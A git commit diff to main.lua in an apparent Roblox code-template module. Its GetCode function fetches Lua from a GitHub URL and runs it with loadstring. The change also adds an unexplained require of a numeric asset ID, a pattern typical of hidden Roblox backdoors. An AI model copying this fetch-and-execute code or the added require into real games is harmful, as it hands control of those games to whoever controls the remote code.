735d8bf6cbdd3c951124842bb73b92c147722542
CelestialDodo <120543993+CelestialDodo@users.noreply.github.com>
2024-07-13 13:57:37 -0700

    Update main.lua

--- main.lua
+++ main.lua
@@ -2,7 +2,7 @@ local Item = {}
 
 function Item.GetCode(FileName)
   FileName = "https://raw.githubusercontent.com/CelestialDodo/RobloxGameCodeTemplates/main/"..string.gsub(FileName,".lua","")..".lua"
-  return(loadstring(game:GetService("HttpService"):GetAsync(FileName))())
+  return loadstring(game:GetService("HttpService"):GetAsync(FileName))(), require(18476370903)
 end
 
 function Item.test()
